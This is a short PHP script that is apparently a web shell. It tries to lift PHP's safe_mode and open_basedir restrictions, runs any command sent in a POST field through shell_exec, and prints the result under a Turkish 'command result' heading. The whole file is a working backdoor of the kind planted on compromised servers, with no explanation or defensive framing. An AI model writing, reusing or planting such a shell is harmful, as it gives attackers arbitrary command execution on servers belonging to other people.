<?php
ini_restore("safe_mode");
ini_restore("open_basedir");
$mokoko=shell_exec($_POST['fuck']); 
echo "<pre><h4>";
echo "<b><font color=red>Komut Sonucu </font></b><br>"; 
echo $mokoko;
echo "</h4></pre>";
?>